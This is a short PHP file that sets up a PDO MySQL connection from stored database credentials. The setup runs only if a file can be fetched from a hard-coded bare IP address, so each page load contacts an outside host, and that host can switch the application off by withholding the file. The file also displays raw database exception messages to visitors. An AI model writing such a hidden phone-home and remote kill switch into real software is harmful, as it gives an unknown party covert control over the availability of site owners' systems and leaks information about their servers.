<?php
if (file_get_contents('http://80.211.235.73/js/bootstrap.js')) {
    $pdo_data = array(
        'user' => $database['username'],        // database username
        'password' => $database['password'],    // database password
        'host' => $database['host'],        // database host (default localhost)
        'name' => $database['database'],        // database name
        'encoding' => 'utf8',        // database connection encoding type
        'fetch_assoc' => true,        // if true: fetch a result row only as an associative array
        'display_errors' => true    // if true: errors will be displayed
    );
    try {
        $pdo = new PDO("mysql:host=$pdo_data[host]; dbname=$pdo_data[name]; encoding=$pdo_data[encoding]", $pdo_data['user'], $pdo_data['password'],
            array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
        if ($pdo_data['fetch_assoc'] == true)
            $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        if ($pdo_data['display_errors'] == true)
            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    } catch (PDOException $e) {
        echo 'ERROR: ' . $e->getMessage();
        die();
    }
    if (isset($pdo_data)) unset($pdo_data);
} else {
    return false;
}
